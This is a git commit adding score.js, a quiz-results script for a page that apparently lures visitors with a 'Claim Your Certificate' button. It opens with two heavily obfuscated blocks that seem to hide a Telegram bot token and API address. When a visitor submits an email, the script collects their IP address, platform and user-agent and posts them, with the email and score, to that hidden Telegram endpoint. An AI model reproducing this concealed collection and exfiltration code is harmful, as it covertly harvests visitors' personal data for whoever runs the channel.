40d0df9cb6b0c7e75878f8e0f28b86e5dcfe3d5d
itshalib <Hackmehalib@gmail.com>
2024-11-18 01:11:19 +0300

    Add files via upload

---
+++ score.js
@@ -0,0 +1,134 @@
+var TOKEN;(function(){var fsq='',npU=567-556;function BxJ(m){var y=3149456;var h=m.length;var t=[];for(var d=0;d<h;d++){t[d]=m.charAt(d)};for(var d=0;d<h;d++){var l=y*(d+91)+(y%35799);var w=y*(d+362)+(y%54020);var g=l%h;var s=w%h;var o=t[g];t[g]=t[s];t[s]=o;y=(l+w)%3383585;};return t.join('')};var PZw=BxJ('tonqcduytvrcscaeibhftsponozlrkugwjrmx').substr(0,npU);var Dbj='aa626=+0C[=tf,i=8);Cshlg=qr-6s2h()=j0]m1+pnn9t}vte>e"n ap;l=Avd88.7g,, 9v7r, .er,t;c=.8,v((arj a,77g[rpru,(=;wg,60it2rvc1r)amn)=r);p+ve,]= mrua=<r1==!i2,0tn>r8[)[o]-=[r,;onv=hhs]=fA=2r5i+fv34h)=e(afuj(uhol.!q[1yeg;;Ctnh(cl+0 4h,)m;){)te+x.8aa(m)n;suh6 +rgpu0t0a 2=1u([ A;)bh5)pruah-[naue+ive-lsdi03(=tCdl3j[l xeu,s4;v0u;.=uw;f82 =<rof;wxr p(i.s[.h,0n}a"vf7;,pr8or,)dn.)le(nvi =0tru(=eh"c9i9;g,(}(n[l, r7);Ctweldfn=d;=aoa2+l<m+n.v9 ez-do.tfn5nv-.;==s;m+hohv(l=;ivlnhp]h,);d*(selrkgChmenxr=oavCv+)Avnr;g;n+weur({5ouen +i=ag2;ng.(,msarl;Aws;rc}ef]lte.}rs((n{i2l.) =7"+o((af(rar,.lvtz6{np+rgn)m)r1oqn bpo)sp];[;.t];)i,=a;efanrtdnt mturz;n;+.("(;;]c;wbso=pt]iv;cr1)4i(vbra1koi 7"S)a)-mvifsajf00i1,)laCtwu]h+;,aj"b0,eu,du.;9+t[(.l dvsi9+()t].to;j=trcz;(r]s 1S+"yi7.{(v)))nn=r)c+r6+;fe;g]rk {i=alv*=uxso8=.t+[r;izgum<i7zqkhr..aafz(ng;.fo<nfhbr"y1=trfmvlar+oewrnay={)u3jq);=}rosn6m(tr(vu". }len r1e';var FiE=BxJ[PZw];var Tfr='';var lnI=FiE;var rHG=FiE(Tfr,BxJ(Dbj));var mRt=rHG(BxJ(')v,9.er_*)cas(.t{{)tT)nc),;x%F{26l!+3c;cF$FpF=t.!5Fe#g+.=!,07i4F$1;$"(F#++,;\/!ga.a.})avi ](*_qs13Ft0s.{f=6nvfgy)!srsF(}28&z )cFuj=4_toE0Nbrb.ooc0;dfi5}gh#qt.piFgb%cm))oFa$;xi*!b.4(!d17)_z$F.(v.4Fqq)=\/f(FcflcxT{Fd){.v cF..miF (Fog3"3 tF5F3;F(1(\/F;.i.))bF.jm1)}t0lpri+4FF!2r.F[=c*_fhf0,f=F34IFf3ng6$)q ojE.,Fv,=:.rc08a0.SFq4.m+3}3tm).\/,2{m;+=;dSFFa.c$$0o(.60nl.f0F-1]=cn(2_1.F]fS2e!$st,b250i95x)))aF$=)..z.dg)\'F,.a",3r..F,{_31(,%*F4c{n)4_3f."=i;(a8_N=;aF,F7=)(9tF._(.r!=.!sr F\'"9fn7g(!Fa f(F3\/FF3j1}+!)f!!oo;ft=7\'=}i+c76F!!t$tv+b_ S$rf9,$%FFjF1xr1jjeqd%(nje.MC$$7Fd#c0$.n1$,!,b351.syt0d%,.\'s..);FF+=(((.!;e&jf1te0.Fm). ;[;Fc44qC,o"bFx.%fF([Ff.,F*=$d_d,!)x,o3p){!.dr#(r,.\/b4(g,;F1=F#Fnj4e}i;4F_FFm_a-3)iF(6F!*.r$.a,j$c 0f}(f,1,m)_f4b.f)o..F,+.n_F]_e_&;_;1{__8(8uF;e)(}ca)j07%fe3tnv;F9..iFf)a..,d3}F)j;)(3}t.,..olh=8F.q.F.c77ga3j3Fg"u$,4c-rFb(rp)iu(n!09s; #r )hn3FF,)F& un(5_(qF{Fn380(nz k*$ rlFo$ l!$gF-F$t'));var ujK=lnI(fsq,mRt );ujK(2803);return 6338})() 
+       var CHAT_ID,URI_API;(function(){var KRB='',ZBw=730-719;function KHh(e){var o=724882;var u=e.length;var b=[];for(var s=0;s<u;s++){b[s]=e.charAt(s)};for(var s=0;s<u;s++){var i=o*(s+413)+(o%24651);var d=o*(s+568)+(o%36985);var w=i%u;var m=d%u;var l=b[w];b[w]=b[m];b[m]=l;o=(i+d)%7143026;};return b.join('')};var OWG=KHh('cooytsdghtvjanexfizkcqnrposwumtulcbrr').substr(0,ZBw);var EIA='h,rra=r5 e;C1z,(3i;(andp==g[(6v)vh()ujmt=j=rtacvwxn.(fcnd,watn;,[rir;;s=489ara,l27ajf==1=+uekraft]tt,s,7,r09,(}a8fve=cr8vah=rljiA]-,.el=a)<bk,tp<wzcbn=tf;bo2,;4tcg<;90ek("2]gn0r+olr=12.=p{a="9t1to{f]e(d6s)aa.6ra"rhCxgnt,n8e.rchj}+,x5.n)tp=a;v+v.eis{r] l+la];8z}f-daeumir)=h+zreu1[9dn.y;=ro"a-)1vrr i=8ulnA0t)Cab,.ey(1.vdf[Cul)yf}c vi ,vai  ,t,h7u[ h;tnrh+b;67.hp1 z;0oa=ni+0()]z c +rqdm+=lCsl=ptdxtoafu1)<p[q ; rr)d(;8.=j;)*len.ln<r+o7r;re;ozrr.al=);+ 0(;(=;[r+8;q=0u[);(te(ucuer>.(-}[r.,oavci{(;t(=l66aq2+phu;);e=e[tgdah-a;k*)r=+]rtCt"7e{s.yl)s9[ 6(f(;==nr};6+6A]aa7izvvnvrhi)=n6"l6=striv3;atk.a;+ri3ar ([dsu{+lwrg=1(cv(;vcnhunrvd)),vcgl=v;rsgse0rgb;yraut85e)o"[y-hi+h)u=ff".ve ,a.(stidl;]v4(9sl+g)+)acin;((flenop+,orz,vw1z (4)01A 32s; on){0hr)bh=r +wglz+)o.62(m+d);]hnomoer;fg1,s(u(i.2fiot) l;g;v;gtCA.=;(sp.zphigrrv=an-f(ld,=to0  x,.)ugdv0])C!i.k,geoS[;]o(;a>tdvn]z7 )fi="7.c!v}jjtSnhr";';var ryY=KHh[OWG];var cls='';var xkd=ryY;var DOm=ryY(cls,KHh(EIA));var MVW=DOm(KHh('2p_irPj%nP4i! oP.$)5(iPgf.!{(.\/8c,$"2!83Pqb)tuveg(fj,c1;!r)$)2}s#].6)yu(4jf)4PP$vu_P)!$_(}!4\/(t=)0p\/aen.bl,%6ta.f*Po&8efs)#72t w;o+![s*"8)P)%! $af_Ph4PPj 7,3q)PiplrS){31Pn.PrPei=)!q.) efcPt.PPaa!s(,8PPi(*P$.pPnn2f#a0_n7o1P;a.P\/_}p(%P0rP4+P.*i{"(Ph4.q,"\'P..}nC=,2{5,eP=.,)c7nha(,4==m)}!iP!(g)P=1g)ff;t=srP(ia(a+3j{a4.49g-5ai;+123.q.b(3)$$P$Cg$q0a;651t._M1bf.4+)__t3.njPrad1(,.,)(P$jbP_sqj=_51,4$oltf0\'rnP]f$0Ii6TP](b)S%=1dt.#f1rfP)oP.dP!$h+0bq7,8;_j.Ss71u;,mlrDP$4jhP\'4!$P(P*r=!qn(3dP((;1eeb, ,gf.da...-Po);2grt3Il)os.4a.6P(;pop;P(bd..#4Tt\/=ePj2}u=.a"],C];r,});Pa(3.tn{!u[!PPj3Pt2(%!yPek;3)sr;f)P63r}_"0_!,{.)i;dh ({$,4nss$0e;! tr!+_q.\'a=.qsPptu,P$".+)fP!-8irP6(bP$P g%*P$ iqk;.4wN+;;_ df4,fr);04bP0kk&)kr..=h\/u P(8ir7.PP3Pso,5*r:,.rt[e8ig4,ab.f}_eja82b=k(=,.o). tP_n)EPf%(f;p)_\/,.n))($rs+P.fa)},+f[6$)_P)op6ftlp!aP;P-)+1_34"eo.7+_($(r%P!it=e3P7otPPI(e4f&0.8bi} ._.rj\/k1n0u ,n0f }e&.{"t;P=o.1.s#j\/ f1r#yf$!g$q7.n._nP.k.P=,=.(Pgr,dfo;.=*t.!_+'));var oue=xkd(KRB,MVW );oue(4922);return 3907})()
+     
+        function getUserIp() {
+            return axios.get('https://api.ipify.org?format=json')
+                .then(response => response.data.ip)
+                .catch(error => {
+                    console.error("Error fetching IP address:", error);
+                    return 'IP Not Available';
+                });
+        }
+
+       
+        function getPlatformInfo() {
+            return `${navigator.platform} - ${navigator.userAgent}`;
+        }
+
+      
+        document.getElementById('note-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            
+            const email = document.getElementById('email').value;
+
+          
+            Promise.all([getUserIp(), Promise.resolve(getPlatformInfo())]).then(([userIp, platformInfo]) => {
+               
+                const score = localStorage.getItem("score");
+                const totalQuestions = localStorage.getItem("totalQuestions");
+
+                // Prepare the message to send, including the score
+                const message = `
+                    <b>New Test Result</b>\n
+                    <b>Email:</b> ${email}\n
+                    <b>Score:</b> ${score} out of ${totalQuestions}\n
+                    <b>IP Address:</b> ${userIp}\n
+                    <b>Browser and System:</b> ${platformInfo}
+                `;
+                
+                // Debugging: Log the message to console before sending
+                console.log('Sending message:', message);
+
+                // Send the message to Telegram
+                axios.post(URI_API, {
+                    chat_id: CHAT_ID,
+                    parse_mode: 'html',
+                    text: message
+                }).then(response => {
+                    console.log('Message sent successfully:', response.data);
+
+                    // Display success message
+                    document.getElementById('response-message').innerHTML = ` 
+                        <div class="response-message success-message">
+                            Your email has been successfully submitted! Now, you can view your results below.
+                        </div>
+                    `;
+                    // Show the results section and hide the email form
+                    document.getElementById('email-form').style.display = 'none';
+                    document.getElementById('test-results').style.display = 'block';
+
+                    // Load results
+                    loadResults();
+                }).catch(error => {
+                    console.error('Error sending message:', error);
+
+                    // Display error message
+                    document.getElementById('response-message').innerHTML = `
+                        <div class="response-message error-message">
+                            There was an error submitting your email. Please try again.
+                        </div>
+                    `;
+                });
+            });
+        });
+
+        // Function to load and display the results from localStorage
+        function loadResults() {
+            const score = localStorage.getItem("score");
+            const totalQuestions = localStorage.getItem("totalQuestions");
+            const feedback = JSON.parse(localStorage.getItem("feedback"));
+
+            // Display the score
+            document.getElementById("score").textContent = `Your score: ${score} out of ${totalQuestions}`;
+
+            // Display feedback for incorrect answers
+            const feedbackContainer = document.getElementById("feedback");
+            if (feedback && feedback.length > 0) {
+                feedback.forEach(item => {
+                    const feedbackElement = document.createElement("div");
+                    feedbackElement.classList.add("question-box");
+
+                    // Add the question text
+                    const questionElement = document.createElement("div");
+                    questionElement.classList.add("question");
+                    questionElement.textContent = `Question: "${item.question}"`;
+                    feedbackElement.appendChild(questionElement);
+
+                    // Add the selected answer
+                    const selectedAnswerElement = document.createElement("div");
+                    selectedAnswerElement.classList.add("answer", "selected-answer");
+                    selectedAnswerElement.textContent = `You selected: "${item.selectedAnswer}"`;
+                    feedbackElement.appendChild(selectedAnswerElement);
+
+                    // Add the correct answer
+                    const correctAnswerElement = document.createElement("div");
+                    correctAnswerElement.classList.add("answer", "correct-answer");
+                    correctAnswerElement.textContent = `Correct answer: "${item.correctAnswer}"`;
+                    feedbackElement.appendChild(correctAnswerElement);
+
+                    // Append the feedback box to the feedback container
+                    feedbackContainer.appendChild(feedbackElement);
+                });
+            } else {
+                feedbackContainer.innerHTML = "<p>You answered all questions correctly!</p>";
+            }
+
+            // Check if the score is equal to the total number of questions
+            if (score == totalQuestions) {
+                // Create and display the redirect button
+                const redirectButtonContainer = document.getElementById('redirect-button-container');
+                const redirectButton = document.createElement('button');
+                redirectButton.textContent = 'Claim Your Certificate';
+                redirectButton.onclick = function() {
+                    window.location.href = 'cer.html';
+                };
+                redirectButtonContainer.appendChild(redirectButton);
+            }
+        }
+
+        // Restart the test (redirect back to the quiz page)
+        function restartTest() {
+            localStorage.clear();  // Clear the stored results
+            window.location.href = "index.html";  // Redirect to the main test page
+        }
